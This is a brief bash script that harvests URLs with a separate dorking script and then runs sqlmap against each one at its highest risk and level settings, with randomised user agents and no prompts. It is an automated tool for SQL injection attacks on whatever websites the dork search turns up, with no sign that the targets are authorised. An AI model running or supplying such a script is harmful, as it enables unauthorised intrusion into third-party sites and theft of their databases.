#!/usr/bin/bash

#see the Python-Projects to find the <dork.py> script

figlet -f slant "SQL INJECTION" | lolcat

python3 dork.py > urls.txt;for URL in $(cat urls.txt);do sqlmap -u "${URL}" --risk=3 --level=5 --random-agent --batch;done
